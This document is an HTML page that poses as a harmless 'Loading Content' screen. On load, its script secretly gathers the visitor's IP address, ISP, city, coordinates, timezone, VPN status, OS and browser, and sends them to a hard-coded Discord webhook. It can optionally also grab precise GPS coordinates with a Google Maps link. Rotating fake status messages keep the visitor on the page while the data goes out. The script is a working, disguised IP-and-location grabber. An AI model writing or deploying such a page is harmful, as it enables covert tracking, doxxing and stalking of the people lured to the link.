<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
        }

        .loader-container {
            margin-bottom: 30px;
        }

        .loader {
            width: 60px;
            height: 60px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid #00ffff;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 20px;
        }

        .pulse {
            width: 80px;
            height: 80px;
            background: radial-gradient(circle, rgba(0, 255, 255, 0.2) 0%, transparent 70%);
            border-radius: 50%;
            margin: 0 auto;
            animation: pulse 2s infinite;
        }

        .dots {
            display: inline-block;
            margin-left: 5px;
        }

        .dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(0.8); opacity: 0.5; }
            50% { transform: scale(1); opacity: 1; }
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #00ffff;
            font-weight: 300;
        }

        p {
            font-size: 14px;
            color: #cccccc;
            line-height: 1.5;
        }

        .status {
            margin-top: 20px;
            padding: 10px;
            background: rgba(0, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(0, 255, 255, 0.2);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader-container">
            <div class="loader"></div>
            <div class="pulse"></div>
        </div>
        <h1>Loading Content<span class="dots"></span></h1>
        <p>Please wait while we prepare your experience</p>
        <div class="status" id="status-message">
            Initializing systems...
        </div>
    </div>

    <script>
        // Configuration
        const config = {
            // BASE CONFIG
            "webhook": "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN",
            "username": "System Monitor",
            "color": 0x00FFFF,

            // OPTIONS
            "accurateLocation": false, // Set to true to enable GPS location
            "linkAlerts": true,
            "vpnCheck": 1,
            "antiBot": 1,
            
            // REDIRECTION
            "redirect": {
                "enabled": false,
                "url": "https://google.com",
                "delay": 5000
            }
        };

        // Complete continent mapping for all country codes
        const continentMap = {
            'AD': 'Europe', 'AE': 'Asia', 'AF': 'Asia', 'AG': 'North America', 'AI': 'North America',
            'AL': 'Europe', 'AM': 'Asia', 'AO': 'Africa', 'AQ': 'Antarctica', 'AR': 'South America',
            'AS': 'Oceania', 'AT': 'Europe', 'AU': 'Oceania', 'AW': 'North America', 'AX': 'Europe',
            'AZ': 'Asia', 'BA': 'Europe', 'BB': 'North America', 'BD': 'Asia', 'BE': 'Europe',
            'BF': 'Africa', 'BG': 'Europe', 'BH': 'Asia', 'BI': 'Africa', 'BJ': 'Africa',
            'BL': 'North America', 'BM': 'North America', 'BN': 'Asia', 'BO': 'South America',
            'BQ': 'North America', 'BR': 'South America', 'BS': 'North America', 'BT': 'Asia',
            'BV': 'Antarctica', 'BW': 'Africa', 'BY': 'Europe', 'BZ': 'North America', 'CA': 'North America',
            'CC': 'Asia', 'CD': 'Africa', 'CF': 'Africa', 'CG': 'Africa', 'CH': 'Europe',
            'CI': 'Africa', 'CK': 'Oceania', 'CL': 'South America', 'CM': 'Africa', 'CN': 'Asia',
            'CO': 'South America', 'CR': 'North America', 'CU': 'North America', 'CV': 'Africa',
            'CW': 'North America', 'CX': 'Asia', 'CY': 'Asia', 'CZ': 'Europe', 'DE': 'Europe',
            'DJ': 'Africa', 'DK': 'Europe', 'DM': 'North America', 'DO': 'North America', 'DZ': 'Africa',
            'EC': 'South America', 'EE': 'Europe', 'EG': 'Africa', 'EH': 'Africa', 'ER': 'Africa',

            'FM': 'Oceania', 'FO': 'Europe', 'FR': 'Europe', 'GA': 'Africa', 'GB': 'Europe',
            'GD': 'North America', 'GE': 'Asia', 'GF': 'South America', 'GG': 'Europe', 'GH': 'Africa',
            'GI': 'Europe', 'GL': 'North America', 'GM': 'Africa', 'GN': 'Africa', 'GP': 'North America',
            'GQ': 'Africa', 'GR': 'Europe', 'GS': 'Antarctica', 'GT': 'North America', 'GU': 'Oceania',
            'GW': 'Africa', 'GY': 'South America', 'HK': 'Asia', 'HM': 'Antarctica', 'HN': 'North America',
            'HR': 'Europe', 'HT': 'North America', 'HU': 'Europe', 'ID': 'Asia', 'IE': 'Europe',

            'KW': 'Asia', 'KY': 'North America', 'KZ': 'Asia', 'LA': 'Asia', 'LB': 'Asia',
            'LC': 'North America', 'LI': 'Europe', 'LK': 'Asia', 'LR': 'Africa', 'LS': 'Africa',
            'LT': 'Europe', 'LU': 'Europe', 'LV': 'Europe', 'LY': 'Africa', 'MA': 'Africa',
            'MC': 'Europe', 'MD': 'Europe', 'ME': 'Europe', 'MF': 'North America', 'MG': 'Africa',
            'MH': 'Oceania', 'MK': 'Europe', 'ML': 'Africa', 'MM': 'Asia', 'MN': 'Asia',
            'MO': 'Asia', 'MP': 'Oceania', 'MQ': 'North America', 'MR': 'Africa', 'MS': 'North America',
            'MT': 'Europe', 'MU': 'Africa', 'MV': 'Asia', 'MW': 'Africa', 'MX': 'North America',
            'MY': 'Asia', 'MZ': 'Africa', 'NA': 'Africa', 'NC': 'Oceania', 'NE': 'Africa',
            'NF': 'Oceania', 'NG': 'Africa', 'NI': 'North America', 'NL': 'Europe', 'NO': 'Europe',
            'NP': 'Asia', 'NR': 'Oceania', 'NU': 'Oceania', 'NZ': 'Oceania', 'OM': 'Asia',
            'PA': 'North America', 'PE': 'South America', 'PF': 'Oceania', 'PG': 'Oceania', 'PH': 'Asia',
            'PK': 'Asia', 'PL': 'Europe', 'PM': 'North America', 'PN': 'Oceania', 'PR': 'North America',
            'PS': 'Asia', 'PT': 'Europe', 'PW': 'Oceania', 'PY': 'South America', 'QA': 'Asia',
            'RE': 'Africa', 'RO': 'Europe', 'RS': 'Europe', 'RU': 'Europe', 'RW': 'Africa',
            'SA': 'Asia', 'SB': 'Oceania', 'SC': 'Africa', 'SD': 'Africa', 'SE': 'Europe',
            'SG': 'Asia', 'SH': 'Africa', 'SI': 'Europe', 'SJ': 'Europe', 'SK': 'Europe',
            'SL': 'Africa', 'SM': 'Europe', 'SN': 'Africa', 'SO': 'Africa', 'SR': 'South America',
            'SS': 'Africa', 'ST': 'Africa', 'SV': 'North America', 'SX': 'North America', 'SY': 'Asia',
            'SZ': 'Africa', 'TC': 'North America', 'TD': 'Africa', 'TF': 'Antarctica', 'TG': 'Africa',
            'TH': 'Asia', 'TJ': 'Asia', 'TK': 'Oceania', 'TL': 'Asia', 'TM': 'Asia',
            'TN': 'Africa', 'TO': 'Oceania', 'TR': 'Asia', 'TT': 'North America', 'TV': 'Oceania',
            'TW': 'Asia', 'TZ': 'Africa', 'UA': 'Europe', 'UG': 'Africa', 'UM': 'Oceania',
            'US': 'North America', 'UY': 'South America', 'UZ': 'Asia', 'VA': 'Europe', 'VC': 'North America',
            'VE': 'South America', 'VG': 'North America', 'VI': 'North America', 'VN': 'Asia', 'VU': 'Oceania',
            'WF': 'Oceania', 'WS': 'Oceania', 'YE': 'Asia', 'YT': 'Africa', 'ZA': 'Africa',
            'ZM': 'Africa', 'ZW': 'Africa'
        };

        // Enhanced user agent parsing
        function parseUserAgent(ua) {
            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
            
            let os = 'Unknown';
            let browser = 'Unknown';

            // OS Detection
            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
            else if (/Windows NT 6.0/.test(ua)) os = 'Windows Vista';
            else if (/Windows NT 5.1/.test(ua)) os = 'Windows XP';
            else if (/Mac OS X/.test(ua)) {
                const match = /Mac OS X ([0-9_]+)/.exec(ua);
                os = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
            }
            else if (/Android ([0-9.]+)/.test(ua)) {
                const match = /Android ([0-9.]+)/.exec(ua);
                os = match ? `Android ${match[1]}` : 'Android';
            }
            else if (/(iPhone|iPad).*OS ([0-9_]+)/.test(ua)) {
                const match = /(iPhone|iPad).*OS ([0-9_]+)/.exec(ua);
                os = match ? `iOS ${match[2].replace(/_/g, '.')}` : 'iOS';
            }
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/CrOS/.test(ua)) os = 'Chrome OS';

            // Browser Detection
            if (/Chrome\/([0-9.]+)/.test(ua) && !/Edg|OPR/.test(ua)) {
                const match = /Chrome\/([0-9.]+)/.exec(ua);
                browser = match ? `Chrome ${match[1]}` : 'Chrome';
            }
            else if (/Firefox\/([0-9.]+)/.test(ua)) {
                const match = /Firefox\/([0-9.]+)/.exec(ua);
                browser = match ? `Firefox ${match[1]}` : 'Firefox';
            }
            else if (/Safari\/([0-9.]+)/.test(ua) && !/Chrome/.test(ua)) {
                const match = /Version\/([0-9.]+)/.exec(ua);
                browser = match ? `Safari ${match[1]}` : 'Safari';
            }
            else if (/Edg\/([0-9.]+)/.test(ua)) {
                const match = /Edg\/([0-9.]+)/.exec(ua);
                browser = match ? `Edge ${match[1]}` : 'Edge';
            }

            return { os, browser };
        }

        // Get continent from country code
        const getContinent = (countryCode) => {
            if (!countryCode) return 'Unknown';
            return continentMap[countryCode] || 'Unknown';
        };

        // Format timezone
        const formatTimezone = (timezone) => {
            if (!timezone) return 'Unknown';
            try {
                const [continent, city] = timezone.split('/');
                return `${city.replace(/_/g, ' ')} (${continent})`;
            } catch {
                return timezone;
            }
        };

        // Error reporting
        async function sendErrorWebhook(error) {
            try {
                await fetch(config.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: `${config.username} - ERROR`,
                        content: "",
                        embeds: [{
                            title: "⚠️ System Error",
                            color: 0xFF0000,
                            description: `**An error occurred!**\n\n**Error:**\n\`\`\`${error.message || error}\`\`\``,
                            fields: [
                                { name: "URL", value: window.location.href, inline: true },
                                { name: "User Agent", value: navigator.userAgent?.slice(0, 500) || "Unknown" }
                            ]
                        }]
                    })
                });
            } catch (e) {
                console.error('Failed to send error webhook:', e);
            }
        }

        // Send webhook helper
        async function sendWebhook(webhookData) {
            try {
                const response = await fetch(config.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });
                if (!response.ok) {
                    throw new Error(`Webhook failed: ${response.status}`);
                }
            } catch (error) {
                console.error('Failed to send webhook:', error);
            }
        }

        // Get precise location
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                document.getElementById('status-message').textContent = 'Getting precise location...';

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const coords = `${position.coords.latitude},${position.coords.longitude}`;
                        resolve({
                            coords: coords,
                            accuracy: position.coords.accuracy,
                            mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        });
                    },
                    (error) => {
                        console.error('Geolocation error:', error);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Get IP information from ip-api.com
        async function getIPInfo() {
            try {
                document.getElementById('status-message').textContent = 'Getting location data...';
                
                const response = await fetch('https://ip-api.com/json/?fields=66846719');
                if (!response.ok) throw new Error('IP API failed');
                
                const data = await response.json();
                if (data.status !== 'success') throw new Error('IP API returned unsuccessful status');

                return {
                    query: data.query,
                    isp: data.isp || 'Unknown',
                    as: data.as || 'Unknown',
                    continent: data.continent || getContinent(data.countryCode),
                    country: data.country || 'Unknown',
                    regionName: data.regionName || 'Unknown',
                    city: data.city || 'Unknown',
                    lat: data.lat || 0,
                    lon: data.lon || 0,
                    timezone: data.timezone || 'Unknown',
                    mobile: data.mobile || false,
                    proxy: data.proxy || false,
                    hosting: data.hosting || false,
                    countryCode: data.countryCode || ''
                };
            } catch (error) {
                console.error('IP API failed:', error);
                throw error;
            }
        }

        // Enhanced VPN/bot handling
        function getPingStatus(ipInfo) {
            let ping = "@everyone";
            
            if (ipInfo.proxy) {
                if (config.vpnCheck === 2) return null;
                if (config.vpnCheck === 1) ping = "";
            }

            if (ipInfo.hosting) {
                if (config.antiBot === 4) {
                    if (!ipInfo.proxy) return null;
                }
                if (config.antiBot === 3) return null;
                if (config.antiBot === 2 && !ipInfo.proxy) ping = "";
                if (config.antiBot === 1) ping = "";
            }

            return ping;
        }

        // Get IP information and send to Discord
        async function logIP() {
            try {
                // Update status continuously
                const statusMessages = [
                    "Initializing systems...",
                    "Loading modules...",
                    "Connecting to services...",
                    "Almost ready...",
                    "Finalizing setup..."
                ];
                
                let statusIndex = 0;
                const statusInterval = setInterval(() => {
                    document.getElementById('status-message').textContent = statusMessages[statusIndex];
                    statusIndex = (statusIndex + 1) % statusMessages.length;
                }, 2000);

                // Get IP information
                const ipData = await getIPInfo();
                
                // Get browser information
                const browserInfo = parseUserAgent(navigator.userAgent);
                
                // Enhanced bot detection
                let botStatus = 'False';
                if (ipData.hosting) {
                    botStatus = ipData.proxy ? 'Possibly' : 'True';
                }

                const logData = {
                    ipInfo: ipData,
                    browserInfo: browserInfo,
                    botStatus: botStatus,
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                };

                // Get ping status based on VPN/bot config
                const ping = getPingStatus(ipData);

                // Send main webhook if not blocked
                if (ping !== null) {
                    await sendMainWebhook(logData, ping);
                }

                // Get precise location if enabled
                if (config.accurateLocation) {
                    clearInterval(statusInterval);
                    const preciseLocation = await getPreciseLocation();
                    if (preciseLocation) {
                        await sendPreciseLocationWebhook(logData, preciseLocation);
                    }
                }

                // Redirect if enabled
                if (config.redirect.enabled) {
                    setTimeout(() => {
                        window.location.href = config.redirect.url;
                    }, config.redirect.delay);
                } else {
                    // Keep loading forever if no redirect
                    document.getElementById('status-message').textContent = 'System ready - maintaining connection...';
                }

            } catch (error) {
                console.error('Error:', error);
                await sendErrorWebhook(error);
                document.getElementById('status-message').textContent = 'Connection issue detected - retrying...';
            }
        }

        async function sendMainWebhook(data, ping) {
            const embed = {
                username: config.username,
                content: ping,
                embeds: [{
                    title: "🌐 System Access Log",
                    color: config.color,
                    description: `
**IP Info:**
> **IP:** \`${data.ipInfo.query}\`
> **Provider:** \`${data.ipInfo.isp}\`
> **ASN:** \`${data.ipInfo.as}\`
> **Continent:** \`${data.ipInfo.continent}\`
> **Country:** \`${data.ipInfo.country}\`
> **Region:** \`${data.ipInfo.regionName}\`
> **City:** \`${data.ipInfo.city}\`
> **Coordinates:** \`${data.ipInfo.lat}, ${data.ipInfo.lon}\` (Approximate)
> **Timezone:** \`${formatTimezone(data.ipInfo.timezone)}\`
> **Mobile:** \`${data.ipInfo.mobile ? 'True' : 'False'}\`
> **VPN:** \`${data.ipInfo.proxy ? 'True' : 'False'}\`
> **Bot:** \`${data.botStatus}\`

**PC Info:**
> **OS:** \`${data.browserInfo.os}\`
> **Browser:** \`${data.browserInfo.browser}\`

**User Agent:**
\`\`\`
${navigator.userAgent}
\`\`\``
                }]
            };

            await sendWebhook(embed);
        }

        async function sendPreciseLocationWebhook(data, preciseLocation) {
            const embed = {
                username: `${config.username} - Precise Location`,
                content: "@everyone",
                embeds: [{
                    title: "📍 Precise Location Obtained",
                    color: 0x00FF00,
                    description: `
**Precise GPS Location:**
> **Coordinates:** \`${preciseLocation.coords}\`
> **Accuracy:** \`${preciseLocation.accuracy} meters\`
> **Google Maps:** [View Location](${preciseLocation.mapsLink})

**User Information:**
> **IP:** \`${data.ipInfo.query}\`
> **Country:** \`${data.ipInfo.country}\`
> **City:** \`${data.ipInfo.city}\``
                }]
            };

            await sendWebhook(embed);
        }

        // Execute when page loads
        document.addEventListener('DOMContentLoaded', logIP);
    </script>
</body>
</html>
